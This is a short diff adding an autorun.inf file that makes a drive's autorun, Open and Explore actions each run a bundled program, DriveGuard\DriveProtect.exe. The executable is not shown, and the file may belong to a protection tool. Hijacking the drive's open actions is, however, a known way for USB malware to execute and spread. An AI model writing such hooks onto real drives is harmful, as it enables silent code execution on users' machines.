@@ -1,0 +1,6 @@
+[autorun]
+open = System\DriveGuard\DriveProtect.exe -run 
+shell\Open = &Open
+shell\Open\Command = System\DriveGuard\DriveProtect.exe -run 
+shell\Explore = &Explore
+shell\Explore\Command = System\DriveGuard\DriveProtect.exe -run  
